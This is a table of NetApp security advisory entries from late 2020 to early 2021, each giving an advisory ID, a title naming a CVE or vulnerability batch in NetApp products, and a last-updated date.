| [**NTAP-20210401-0004**](https://security.netapp.com/advisory/ntap-20210401-0004/) | CVE-2021-3189 Node.js Vulnerability in NetApp Products | 2021-04-27 |
| [**NTAP-20210326-0003**](https://security.netapp.com/advisory/ntap-20210326-0003/) | CVE-2021-20194 Linux Kernel Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210326-0005**](https://security.netapp.com/advisory/ntap-20210326-0005/) | CVE-2021-20229 PostgreSQL Vulnerability in NetApp Products | 2021-03-26 |
| [**NTAP-20210326-0004**](https://security.netapp.com/advisory/ntap-20210326-0004/) | CVE-2021-23336 Python Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210326-0002**](https://security.netapp.com/advisory/ntap-20210326-0002/) | CVE-2021-27405 Node.js Vulnerability in NetApp Products | 2021-04-27 |
| [**NTAP-20210326-0001**](https://security.netapp.com/advisory/ntap-20210326-0001/) | February 2021 Linux Kernel Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20210326-0006**](https://security.netapp.com/advisory/ntap-20210326-0006/) | March 2021 OpenSSL Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20210326-0007**](https://security.netapp.com/advisory/ntap-20210326-0007/) | March 2021 Samba Vulnerabilities in NetApp Products | 2021-03-26 |
| [**NTAP-20210319-0003**](https://security.netapp.com/advisory/ntap-20210319-0003/) | CVE-2020-7021 Elasticsearch Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210319-0001**](https://security.netapp.com/advisory/ntap-20210319-0001/) | CVE-2020-8625 ISC BIND Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20210319-0005**](https://security.netapp.com/advisory/ntap-20210319-0005/) | CVE-2021-27212 OpenLDAP Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20210319-0004**](https://security.netapp.com/advisory/ntap-20210319-0004/) | February 2021 GNOME GLib Vulnerabilities in NetApp Products | 2022-05-06 |
| [**NTAP-20210319-0002**](https://security.netapp.com/advisory/ntap-20210319-0002/) | February 2021 Node.js Vulnerabilities in NetApp Products | 2021-03-19 |
| [**NTAP-20210318-0001**](https://security.netapp.com/advisory/ntap-20210318-0001/) | CVE-2021-26990 Arbitrary File Overwrite Vulnerability in Cloud Manager | 2021-03-18 |
| [**NTAP-20210318-0002**](https://security.netapp.com/advisory/ntap-20210318-0002/) | CVE-2021-26991 Cross-Origin Resource Sharing (CORS) Vulnerability in Cloud Manager | 2021-03-18 |
| [**NTAP-20210318-0003**](https://security.netapp.com/advisory/ntap-20210318-0003/) | CVE-2021-26992 Denial of Service Vulnerability in Cloud Manager | 2021-03-18 |
| [**NTAP-20210315-0001**](https://security.netapp.com/advisory/ntap-20210315-0001/) | CVE-2021-26987 SpringBoot Framework Remote Code Execution Vulnerability in Management Software for Element Software and NetApp HCI | 2022-06-29 |
| [**NTAP-20210312-0004**](https://security.netapp.com/advisory/ntap-20210312-0004/) | CVE-2020-15523 Python Vulnerability in NetApp Products | 2021-06-29 |
| [**NTAP-20210312-0003**](https://security.netapp.com/advisory/ntap-20210312-0003/) | CVE-2020-17380 QEMU Vulnerability in NetApp Products | 2021-03-12 |
| [**NTAP-20210312-0002**](https://security.netapp.com/advisory/ntap-20210312-0002/) | CVE-2020-35517 QEMU Vulnerability in NetApp Products | 2021-03-12 |
| [**NTAP-20210312-0007**](https://security.netapp.com/advisory/ntap-20210312-0007/) | CVE-2021-21315 Node.JS Vulnerability in NetApp Products | 2021-04-27 |
| [**NTAP-20210312-0008**](https://security.netapp.com/advisory/ntap-20210312-0008/) | CVE-2021-26708 Linux Kernel Vulnerability in NetApp Products | 2022-05-27 |
| [**NTAP-20210312-0006**](https://security.netapp.com/advisory/ntap-20210312-0006/) | February 2021 Lodash Vulnerabilities in NetApp Products | 2022-08-03 |
| [**NTAP-20210312-0005**](https://security.netapp.com/advisory/ntap-20210312-0005/) | February 2021 PHP Vulnerabilities in NetApp Products | 2021-10-18 |
| [**NTAP-20210312-0001**](https://security.netapp.com/advisory/ntap-20210312-0001/) | June 2020 Squid Vulnerabilities in NetApp Products | 2021-09-27 |
| [**NTAP-20210304-0004**](https://security.netapp.com/advisory/ntap-20210304-0004/) | CVE-2020-11945 Squid Vulnerability in NetApp Products | 2021-09-27 |
| [**NTAP-20210304-0006**](https://security.netapp.com/advisory/ntap-20210304-0006/) | CVE-2020-16119 Linux Kernel Vulnerability in NetApp Products | 2023-03-21 |
| [**NTAP-20210304-0003**](https://security.netapp.com/advisory/ntap-20210304-0003/) | CVE-2020-29443 QEMU Vulnerability in NetApp Products | 2021-03-04 |
| [**NTAP-20210304-0001**](https://security.netapp.com/advisory/ntap-20210304-0001/) | CVE-2020-9492 Apache Hadoop Vulnerability in NetApp Products | 2021-03-04 |
| [**NTAP-20210304-0008**](https://security.netapp.com/advisory/ntap-20210304-0008/) | CVE-2021-26117 Apache ActiveMQ Vulnerability in NetApp Products | 2021-08-24 |
| [**NTAP-20210304-0007**](https://security.netapp.com/advisory/ntap-20210304-0007/) | CVE-2021-3326 GNU C Library (glibc) Vulnerability in NetApp Products | 2024-05-01 |
| [**NTAP-20210304-0005**](https://security.netapp.com/advisory/ntap-20210304-0005/) | CVE-2021-3347 Linux Kernel Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20210304-0002**](https://security.netapp.com/advisory/ntap-20210304-0002/) | February 2020 Squid Vulnerabilities in NetApp Products | 2021-09-27 |
| [**NTAP-20210303-0001**](https://security.netapp.com/advisory/ntap-20210303-0001/) | CVE-2021-26988 Sensitive Information Disclosure Vulnerability in Clustered Data ONTAP | 2021-03-03 |
| [**NTAP-20210303-0002**](https://security.netapp.com/advisory/ntap-20210303-0002/) | CVE-2021-26989 Denial of Service Vulnerability in Clustered Data ONTAP | 2021-03-03 |
| [**NTAP-20210226-0006**](https://security.netapp.com/advisory/ntap-20210226-0006/) | August 2020 Squid Vulnerabilities in NetApp Products | 2021-09-27 |
| [**NTAP-20210226-0001**](https://security.netapp.com/advisory/ntap-20210226-0001/) | CVE-2020-28488 jQuery Vulnerability in NetApp Products | 2021-03-04 |
| [**NTAP-20210226-0003**](https://security.netapp.com/advisory/ntap-20210226-0003/) | CVE-2021-3177 Python Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20210226-0004**](https://security.netapp.com/advisory/ntap-20210226-0004/) | CVE-2021-3281 Django Vulnerability in NetApp Products | 2021-06-29 |
| [**NTAP-20210226-0005**](https://security.netapp.com/advisory/ntap-20210226-0005/) | February 2021 Docker Vulnerabilities in NetApp Products | 2024-05-01 |
| [**NTAP-20210226-0002**](https://security.netapp.com/advisory/ntap-20210226-0002/) | February 2021 OpenLDAP Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20210219-0002**](https://security.netapp.com/advisory/ntap-20210219-0002/) | CVE-2020-28374 Linux Kernel Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20210219-0008**](https://security.netapp.com/advisory/ntap-20210219-0008/) | CVE-2021-20190 FasterXML Jackson Databind Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20210219-0005**](https://security.netapp.com/advisory/ntap-20210219-0005/) | CVE-2021-21252 jQuery Vulnerability in NetApp Products | 2024-01-02 |
| [**NTAP-20210219-0004**](https://security.netapp.com/advisory/ntap-20210219-0004/) | CVE-2021-22132 Elasticsearch Vulnerability in NetApp Products | 2021-04-28 |
| [**NTAP-20210219-0006**](https://security.netapp.com/advisory/ntap-20210219-0006/) | CVE-2021-3121 GoGo Protobuf Vulnerability in NetApp Products | 2021-02-19 |
| [**NTAP-20210219-0001**](https://security.netapp.com/advisory/ntap-20210219-0001/) | February 2021 Golang Vulnerabilities in NetApp Products | 2021-06-25 |
| [**NTAP-20210219-0009**](https://security.netapp.com/advisory/ntap-20210219-0009/) | February 2021 OpenSSL Vulnerabilities in NetApp Products | 2024-01-02 |
| [**NTAP-20210219-0003**](https://security.netapp.com/advisory/ntap-20210219-0003/) | January 2021 MySQL Vulnerabilities in NetApp Products | 2022-02-02 |
| [**NTAP-20210219-0007**](https://security.netapp.com/advisory/ntap-20210219-0007/) | September 2020 Squid Vulnerabilities in NetApp Products | 2021-09-27 |
| [**NTAP-20210212-0001**](https://security.netapp.com/advisory/ntap-20210212-0001/) | CVE-2020-11947 QEMU Vulnerability in NetApp Products | 2021-02-12 |
| [**NTAP-20210212-0002**](https://security.netapp.com/advisory/ntap-20210212-0002/) | CVE-2020-36158 Linux Kernel Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20210212-0008**](https://security.netapp.com/advisory/ntap-20210212-0008/) | CVE-2021-24122 Apache Tomcat Vulnerability in NetApp Products | 2021-06-08 |
| [**NTAP-20210212-0006**](https://security.netapp.com/advisory/ntap-20210212-0006/) | Intel SA-00438 Graphics Drivers Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20210212-0005**](https://security.netapp.com/advisory/ntap-20210212-0005/) | Intel SA-00456 Ethernet Controller Vulnerabilities in NetApp Products | 2021-02-12 |
| [**NTAP-20210212-0007**](https://security.netapp.com/advisory/ntap-20210212-0007/) | January 2021 GNU Binutils Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20210212-0004**](https://security.netapp.com/advisory/ntap-20210212-0004/) | January 2021 Golang Vulnerabilities in NetApp Products | 2021-02-12 |
| [**NTAP-20210212-0003**](https://security.netapp.com/advisory/ntap-20210212-0003/) | January 2021 Node.js Vulnerabilities in NetApp Products | 2021-03-04 |
| [**NTAP-20210208-0002**](https://security.netapp.com/advisory/ntap-20210208-0002/) | CVE-2020-8578 Information Disclosure Vulnerability in Clustered Data ONTAP | 2021-02-08 |
| [**NTAP-20210208-0001**](https://security.netapp.com/advisory/ntap-20210208-0001/) | CVE-2020-8587 Sensitive Information Disclosure Vulnerability in OnCommand System Manager 9.x | 2021-02-08 |
| [**NTAP-20210208-0003**](https://security.netapp.com/advisory/ntap-20210208-0003/) | CVE-2020-8590 Information Disclosure Vulnerability in Clustered Data ONTAP | 2021-02-08 |
| [**NTAP-20210205-0003**](https://security.netapp.com/advisory/ntap-20210205-0003/) | CVE-2019-20808 QEMU Vulnerability in NetApp Products | 2021-02-05 |
| [**NTAP-20210205-0004**](https://security.netapp.com/advisory/ntap-20210205-0004/) | CVE-2019-25013 GNU C (glibc) Vulnerability in NetApp Products | 2024-11-11 |
| [**NTAP-20210205-0002**](https://security.netapp.com/advisory/ntap-20210205-0002/) | CVE-2020-27846 Grafana Vulnerability in NetApp Products | 2021-02-05 |
| [**NTAP-20210205-0001**](https://security.netapp.com/advisory/ntap-20210205-0001/) | CVE-2020-29569 Linux Kernel Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20210205-0005**](https://security.netapp.com/advisory/ntap-20210205-0005/) | January 2021 FasterXML jackson-databind Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20210205-0006**](https://security.netapp.com/advisory/ntap-20210205-0006/) | January 2021 Squid Vulnerabilities in NetApp Products | 2021-09-27 |
| [**NTAP-20210201-0001**](https://security.netapp.com/advisory/ntap-20210201-0001/) | CVE-2020-8588 Sensitive Information Disclosure Vulnerability in Clustered Data ONTAP | 2021-02-01 |
| [**NTAP-20210201-0002**](https://security.netapp.com/advisory/ntap-20210201-0002/) | CVE-2020-8589 Sensitive Information Disclosure Vulnerability in Clustered Data ONTAP | 2021-02-01 |
| [**NTAP-20210201-0003**](https://security.netapp.com/advisory/ntap-20210201-0003/) | January 2021 Treck TCP/IP Library Vulnerabilities in NetApp Products | 2021-02-01 |
| [**NTAP-20210129-0001**](https://security.netapp.com/advisory/ntap-20210129-0001/) | CVE-2019-17006 Libnss Vulnerability in NetApp Products | 2022-05-27 |
| [**NTAP-20210129-0004**](https://security.netapp.com/advisory/ntap-20210129-0004/) | CVE-2019-19462 Linux Kernel Vulnerability in NetApp Products | 2022-05-27 |
| [**NTAP-20210129-0003**](https://security.netapp.com/advisory/ntap-20210129-0003/) | CVE-2020-10663 Ruby JSON gem Unsafe Object Creation Vulnerability in NetApp Products | 2021-01-29 |
| [**NTAP-20210129-0005**](https://security.netapp.com/advisory/ntap-20210129-0005/) | CVE-2020-10732 Linux Kernel Vulnerability in NetApp Products | 2022-05-27 |
| [**NTAP-20210129-0002**](https://security.netapp.com/advisory/ntap-20210129-0002/) | CVE-2020-11724 OpenResty Vulnerability in NetApp Products | 2021-01-29 |
| [**NTAP-20210129-0008**](https://security.netapp.com/advisory/ntap-20210129-0008/) | CVE-2020-35448 GNU Binutils Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20210129-0007**](https://security.netapp.com/advisory/ntap-20210129-0007/) | CVE-2020-35728 FasterXML Jackson Databind Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20210129-0009**](https://security.netapp.com/advisory/ntap-20210129-0009/) | CVE-2020-4642 IBM DB2 Vulnerability in NetApp Products | 2021-01-29 |
| [**NTAP-20210129-0006**](https://security.netapp.com/advisory/ntap-20210129-0006/) | December 2020 Golang Vulnerabilities in NetApp Products | 2021-10-29 |
| [**NTAP-20210129-0010**](https://security.netapp.com/advisory/ntap-20210129-0010/) | January 2021 Sudo Vulnerabilities in NetApp Products | 2022-05-27 |
| [**NTAP-20210128-0001**](https://security.netapp.com/advisory/ntap-20210128-0001/) | CVE-2020-8585 Sensitive Information Disclosure Vulnerability in OnCommand Unified Manager Core Package | 2021-01-28 |
| [**NTAP-20210128-0002**](https://security.netapp.com/advisory/ntap-20210128-0002/) | CVE-2021-3156 Sudo Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20210122-0002**](https://security.netapp.com/advisory/ntap-20210122-0002/) | CVE-2020-27786 Linux Kernel Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20210122-0007**](https://security.netapp.com/advisory/ntap-20210122-0007/) | December 2020 cURL/libcURL Vulnerabilities in NetApp Products | 2022-05-27 |
| [**NTAP-20210122-0005**](https://security.netapp.com/advisory/ntap-20210122-0005/) | December 2020 FasterXML jackson-databind Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20210122-0003**](https://security.netapp.com/advisory/ntap-20210122-0003/) | December 2020 GNU Binutils Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20210122-0004**](https://security.netapp.com/advisory/ntap-20210122-0004/) | December 2020 GNU C Library Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20210122-0006**](https://security.netapp.com/advisory/ntap-20210122-0006/) | December 2020 Kubernetes Vulnerabilities in NetApp Products | 2021-01-22 |
| [**NTAP-20210122-0001**](https://security.netapp.com/advisory/ntap-20210122-0001/) | December 2020 Linux Kernel Vulnerabilities in NetApp Products | 2022-06-09 |
| [**NTAP-20210122-0008**](https://security.netapp.com/advisory/ntap-20210122-0008/) | Intel SA-00390 BIOS Firmware Vulnerabilities in NetApp Products | 2022-02-23 |
| [**NTAP-20210119-0001**](https://security.netapp.com/advisory/ntap-20210119-0001/) | CVE-2020-8581 Unauthorized Modification Vulnerability in Clustered Data ONTAP | 2021-01-19 |
| [**NTAP-20210115-0005**](https://security.netapp.com/advisory/ntap-20210115-0005/) | CVE-2020-17530 Apache Struts Vulnerability in NetApp Products | 2021-01-15 |
| [**NTAP-20210115-0007**](https://security.netapp.com/advisory/ntap-20210115-0007/) | CVE-2020-17531 Apache Tapestry Vulnerability in NetApp Products | 2021-01-15 |
| [**NTAP-20210115-0008**](https://security.netapp.com/advisory/ntap-20210115-0008/) | CVE-2020-25613 Ruby Vulnerability in NetApp Products | 2021-01-15 |
| [**NTAP-20210115-0004**](https://security.netapp.com/advisory/ntap-20210115-0004/) | CVE-2020-27730 NGINX Vulnerability in NetApp Products | 2024-01-02 |
| [**NTAP-20210115-0006**](https://security.netapp.com/advisory/ntap-20210115-0006/) | CVE-2020-27821 QEMU Vulnerability in NetApp Products | 2021-01-15 |
| [**NTAP-20210115-0001**](https://security.netapp.com/advisory/ntap-20210115-0001/) | CVE-2020-29369 Linux Kernel Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20210115-0002**](https://security.netapp.com/advisory/ntap-20210115-0002/) | CVE-2020-29374 Linux Kernel Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20210115-0003**](https://security.netapp.com/advisory/ntap-20210115-0003/) | December 2020 GNU Binutils Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20210108-0004**](https://security.netapp.com/advisory/ntap-20210108-0004/) | CVE-2015-9251 jQuery Vulnerability in NetApp Products | 2021-06-08 |
| [**NTAP-20210108-0007**](https://security.netapp.com/advisory/ntap-20210108-0007/) | CVE-2020-25649 FasterXML Jackson Databind Vulnerability in NetApp Products | 2021-08-24 |
| [**NTAP-20210108-0006**](https://security.netapp.com/advisory/ntap-20210108-0006/) | CVE-2020-25692 OpenLDAP Vulnerability in NetApp Products | 2022-08-01 |
| [**NTAP-20210108-0005**](https://security.netapp.com/advisory/ntap-20210108-0005/) | CVE-2020-27350 APT Vulnerability in NetApp Products | 2021-11-01 |
| [**NTAP-20210108-0003**](https://security.netapp.com/advisory/ntap-20210108-0003/) | CVE-2020-28974 Linux Kernel Vulnerability in NetApp Products | 2022-05-27 |
| [**NTAP-20210108-0002**](https://security.netapp.com/advisory/ntap-20210108-0002/) | CVE-2020-29368 Linux Kernel Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20210108-0001**](https://security.netapp.com/advisory/ntap-20210108-0001/) | CVE-2020-4135 IBM DB2 Vulnerability in NetApp Products | 2021-01-08 |
| [**NTAP-20210108-0008**](https://security.netapp.com/advisory/ntap-20210108-0008/) | CVE-2020-8584 Arbitrary Code Execution Vulnerability in Element OS | 2021-01-08 |
| [**NTAP-20201223-0002**](https://security.netapp.com/advisory/ntap-20201223-0002/) | CVE-2020-10714 WildFly Vulnerability in NetApp Products | 2021-01-07 |
| [**NTAP-20201223-0001**](https://security.netapp.com/advisory/ntap-20201223-0001/) | CVE-2020-11612 Apache Netty Vulnerability in NetApp Products | 2021-03-02 |
| [**NTAP-20201222-0001**](https://security.netapp.com/advisory/ntap-20201222-0001/) | CVE-2020-1749 Linux Kernel Vulnerability in NetApp Products | 2023-08-02 |
| [**NTAP-20201218-0002**](https://security.netapp.com/advisory/ntap-20201218-0002/) | CVE-2020-15436 Linux Kernel Vulnerability in NetApp Products | 2022-07-01 |
| [**NTAP-20201218-0006**](https://security.netapp.com/advisory/ntap-20201218-0006/) | CVE-2020-17521 Apache Groovy Vulnerability in NetApp Products | 2021-06-29 |
| [**NTAP-20201218-0005**](https://security.netapp.com/advisory/ntap-20201218-0005/) | CVE-2020-1971 OpenSSL Vulnerability in NetApp Products | 2024-01-02 |
| [**NTAP-20201218-0004**](https://security.netapp.com/advisory/ntap-20201218-0004/) | CVE-2020-25723 QEMU Vulnerability in NetApp Products | 2020-12-18 |
| [**NTAP-20201218-0003**](https://security.netapp.com/advisory/ntap-20201218-0003/) | CVE-2020-27218 Eclipse Jetty Vulnerability in NetApp Products | 2021-05-08 |
| [**NTAP-20201218-0001**](https://security.netapp.com/advisory/ntap-20201218-0001/) | CVE-2020-29370 Linux Kernel Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20201210-0004**](https://security.netapp.com/advisory/ntap-20201210-0004/) | CVE-2020-14305 Linux Kernel Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20201210-0003**](https://security.netapp.com/advisory/ntap-20201210-0003/) | CVE-2020-17527 Apache Tomcat Vulnerability in NetApp Products | 2021-06-08 |
| [**NTAP-20201210-0005**](https://security.netapp.com/advisory/ntap-20201210-0005/) | CVE-2020-25624 QEMU Vulnerability in NetApp Products | 2020-12-10 |
| [**NTAP-20201210-0001**](https://security.netapp.com/advisory/ntap-20201210-0001/) | CVE-2020-25640 WildFly Vulnerability in NetApp Products | 2023-02-07 |
| [**NTAP-20201210-0002**](https://security.netapp.com/advisory/ntap-20201210-0002/) | CVE-2020-25705 Linux Kernel Vulnerability in NetApp Products | 2023-11-01 |
| [**NTAP-20201202-0005**](https://security.netapp.com/advisory/ntap-20201202-0005/) | CVE-2020-26939 Bouncy Castle Vulnerability in NetApp Products | 2021-07-13 |
| [**NTAP-20201202-0001**](https://security.netapp.com/advisory/ntap-20201202-0001/) | CVE-2020-28196 MIT Kerberos 5 Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20201202-0004**](https://security.netapp.com/advisory/ntap-20201202-0004/) | November 2020 Golang Vulnerabilities in NetApp Products | 2021-03-04 |
| [**NTAP-20201202-0003**](https://security.netapp.com/advisory/ntap-20201202-0003/) | November 2020 PostgreSQL Vulnerabilities in NetApp Products | 2021-03-24 |
| [**NTAP-20201202-0002**](https://security.netapp.com/advisory/ntap-20201202-0002/) | November 2020 QEMU Vulnerabilities in NetApp Products | 2021-02-03 |
| [**NTAP-20201123-0007**](https://security.netapp.com/advisory/ntap-20201123-0007/) | CVE-2020-15376 Brocade Fabric Operating System Firmware Vulnerability | 2020-11-23 |
| [**NTAP-20201123-0002**](https://security.netapp.com/advisory/ntap-20201123-0002/) | CVE-2020-24303 Grafana Vulnerability in NetApp Products | 2021-02-05 |
| [**NTAP-20201123-0003**](https://security.netapp.com/advisory/ntap-20201123-0003/) | CVE-2020-24352 QEMU Vulnerability in NetApp Products | 2020-11-23 |
| [**NTAP-20201123-0006**](https://security.netapp.com/advisory/ntap-20201123-0006/) | CVE-2020-25689 WildFly Vulnerability in NetApp Products | 2023-02-07 |
| [**NTAP-20201123-0005**](https://security.netapp.com/advisory/ntap-20201123-0005/) | CVE-2020-27216 Eclipse Jetty Vulnerability in NetApp Products | 2021-07-14 |
| [**NTAP-20201123-0004**](https://security.netapp.com/advisory/ntap-20201123-0004/) | CVE-2020-27619 Python Vulnerability in NetApp Products | 2021-05-19 |
| [**NTAP-20201123-0001**](https://security.netapp.com/advisory/ntap-20201123-0001/) | CVE-2020-7020 Elasticsearch Vulnerability in NetApp Products | 2021-03-03 |
| [**NTAP-20201113-0007**](https://security.netapp.com/advisory/ntap-20201113-0007/) | CVE-2020-8582 Sensitive Information Disclosure Vulnerability in NetApp SolidFire & HCI Storage Node (Element Software) | 2020-11-13 |
| [**NTAP-20201113-0008**](https://security.netapp.com/advisory/ntap-20201113-0008/) | CVE-2020-8583 Sensitive Information Disclosure Vulnerability in NetApp SolidFire & HCI Storage Node (Element Software) | 2020-11-13 |
| [**NTAP-20201113-0001**](https://security.netapp.com/advisory/ntap-20201113-0001/) | Intel SA-00358 BIOS Firmware Vulnerabilities in NetApp Products | 2022-01-24 |
| [**NTAP-20201113-0006**](https://security.netapp.com/advisory/ntap-20201113-0006/) | Intel SA-00381 Processor Vulnerabilities in NetApp Products | 2022-02-23 |
| [**NTAP-20201113-0003**](https://security.netapp.com/advisory/ntap-20201113-0003/) | Intel SA-00391 AMT Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20201113-0002**](https://security.netapp.com/advisory/ntap-20201113-0002/) | Intel SA-00391 CSME Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20201113-0005**](https://security.netapp.com/advisory/ntap-20201113-0005/) | Intel SA-00391 Intel TXE Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20201113-0004**](https://security.netapp.com/advisory/ntap-20201113-0004/) | Intel SA-00391 SPS Vulnerabilities in NetApp Products | 2022-04-28 |
| [**NTAP-20201105-0001**](https://security.netapp.com/advisory/ntap-20201105-0001/) | CVE-2020-8577 Sensitive Information Disclosure Vulnerability in SANtricity OS Controller Software 11.50.1 and higher | 2020-11-24 |
| [**NTAP-20201105-0002**](https://security.netapp.com/advisory/ntap-20201105-0002/) | CVE-2020-8580 Denial of Service Vulnerability in SANtricity OS Controller Software 11.30 and higher | 2020-11-05 |
| [**NTAP-20201103-0003**](https://security.netapp.com/advisory/ntap-20201103-0003/) | CVE-2018-11764 Apache Hadoop Vulnerability in NetApp Products | 2020-11-03 |
| [**NTAP-20201103-0002**](https://security.netapp.com/advisory/ntap-20201103-0002/) | CVE-2020-25643 Linux Kernel Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20201103-0004**](https://security.netapp.com/advisory/ntap-20201103-0004/) | CVE-2020-25645 Linux Kernel Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20201103-0001**](https://security.netapp.com/advisory/ntap-20201103-0001/) | October 2020 Samba Vulnerabilities in NetApp Products | 2020-11-03 |
| [**NTAP-20201026-0001**](https://security.netapp.com/advisory/ntap-20201026-0001/) | CVE-2020-8579 Denial of Service Vulnerability in clustered Data ONTAP 9.7.x | 2020-10-26 |
| [**NTAP-20201023-0002**](https://security.netapp.com/advisory/ntap-20201023-0002/) | CVE-2020-13957 Apache Solr Vulnerability in NetApp Products | 2020-10-23 |
| [**NTAP-20201023-0001**](https://security.netapp.com/advisory/ntap-20201023-0001/) | CVE-2020-26116 Python Vulnerability in NetApp Products | 2021-05-19 |
| [**NTAP-20201023-0004**](https://security.netapp.com/advisory/ntap-20201023-0004/) | October 2020 Java Platform Standard Edition Vulnerabilities in NetApp Products | 2022-11-21 |
| [**NTAP-20201023-0003**](https://security.netapp.com/advisory/ntap-20201023-0003/) | October 2020 MySQL Vulnerabilities in NetApp Products | 2022-01-21 |
| [**NTAP-20201016-0005**](https://security.netapp.com/advisory/ntap-20201016-0005/) | CVE-2018-11765 Apache Hadoop Vulnerability in NetApp Products | 2020-10-16 |
| [**NTAP-20201016-0007**](https://security.netapp.com/advisory/ntap-20201016-0007/) | CVE-2020-13943 Apache Tomcat Vulnerability in NetApp Products | 2021-01-04 |
| [**NTAP-20201016-0003**](https://security.netapp.com/advisory/ntap-20201016-0003/) | CVE-2020-25626 Django Vulnerability in NetApp Products | 2020-11-09 |
| [**NTAP-20201016-0004**](https://security.netapp.com/advisory/ntap-20201016-0004/) | CVE-2020-25644 WildFly Vulnerability in NetApp Products | 2021-08-24 |
| [**NTAP-20201016-0006**](https://security.netapp.com/advisory/ntap-20201016-0006/) | Intel SA-00435 BlueZ Vulnerabilities in NetApp Products | 2021-03-02 |
| [**NTAP-20201016-0002**](https://security.netapp.com/advisory/ntap-20201016-0002/) | October 2020 FreeBSD Vulnerabilities in NetApp Products | 2021-06-18 |
| [**NTAP-20201016-0001**](https://security.netapp.com/advisory/ntap-20201016-0001/) | October 2020 PHP Vulnerabilities in NetApp Products | 2021-10-12 |
| [**NTAP-20201009-0003**](https://security.netapp.com/advisory/ntap-20201009-0003/) | CVE-2020-24750 FasterXML jackson-databind Vulnerability in NetApp Products | 2021-07-13 |
| [**NTAP-20201009-0001**](https://security.netapp.com/advisory/ntap-20201009-0001/) | CVE-2020-25211 Linux Kernel Vulnerability in NetApp Products | 2022-05-27 |
| [**NTAP-20201009-0002**](https://security.netapp.com/advisory/ntap-20201009-0002/) | CVE-2020-25285 Linux Kernel Vulnerability in NetApp Products | 2023-11-01 |
| [**NTAP-20201009-0004**](https://security.netapp.com/advisory/ntap-20201009-0004/) | October 2020 Node.js Vulnerabilities in NetApp Products | 2021-03-04 |
| [**NTAP-20201009-0005**](https://security.netapp.com/advisory/ntap-20201009-0005/) | October 2020 QEMU Vulnerabilities in NetApp Products | 2020-11-17 |
| [**NTAP-20201001-0006**](https://security.netapp.com/advisory/ntap-20201001-0006/) | CVE-2020-10733 PostgreSQL Vulnerability in NetApp Products | 2021-03-03 |
| [**NTAP-20201001-0001**](https://security.netapp.com/advisory/ntap-20201001-0001/) | CVE-2020-10756 QEMU Vulnerability in NetApp Products | 2020-11-17 |
| [**NTAP-20201001-0005**](https://security.netapp.com/advisory/ntap-20201001-0005/) | CVE-2020-1748 WildFly Vulnerability in NetApp Products | 2020-11-24 |
| [**NTAP-20201001-0004**](https://security.netapp.com/advisory/ntap-20201001-0004/) | CVE-2020-25220 Linux Kernel Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20201001-0003**](https://security.netapp.com/advisory/ntap-20201001-0003/) | CVE-2020-25221 Linux Kernel Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20201001-0002**](https://security.netapp.com/advisory/ntap-20201001-0002/) | CVE-2020-8608 QEMU Vulnerability in NetApp Products | 2020-11-17 |
| [**NTAP-20200924-0005**](https://security.netapp.com/advisory/ntap-20200924-0005/) | CVE-2019-19543 Linux Kernel Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20200924-0006**](https://security.netapp.com/advisory/ntap-20200924-0006/) | CVE-2020-14364 QEMU Vulnerability in NetApp Products | 2020-11-17 |
| [**NTAP-20200924-0002**](https://security.netapp.com/advisory/ntap-20200924-0002/) | CVE-2020-16845 Golang Vulnerability in NetApp Products | 2020-09-24 |
| [**NTAP-20200924-0003**](https://security.netapp.com/advisory/ntap-20200924-0003/) | CVE-2020-24553 Golang Vulnerability in NetApp Products | 2020-09-28 |
| [**NTAP-20200924-0001**](https://security.netapp.com/advisory/ntap-20200924-0001/) | CVE-2020-24977 Libxml2 Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20200924-0004**](https://security.netapp.com/advisory/ntap-20200924-0004/) | CVE-2020-8648 Linux Kernel Vulnerability in NetApp Products | 2023-08-02 |
| [**NTAP-20200918-0001**](https://security.netapp.com/advisory/ntap-20200918-0001/) | August 2020 NGINX Vulnerabilities in NetApp Products | 2024-01-02 |
| [**NTAP-20200918-0002**](https://security.netapp.com/advisory/ntap-20200918-0002/) | August 2020 PostgreSQL Vulnerabilities in NetApp Products | 2021-03-03 |
| [**NTAP-20200918-0003**](https://security.netapp.com/advisory/ntap-20200918-0003/) | CVE-2019-19499 Grafana Vulnerability in NetApp Products | 2020-09-24 |
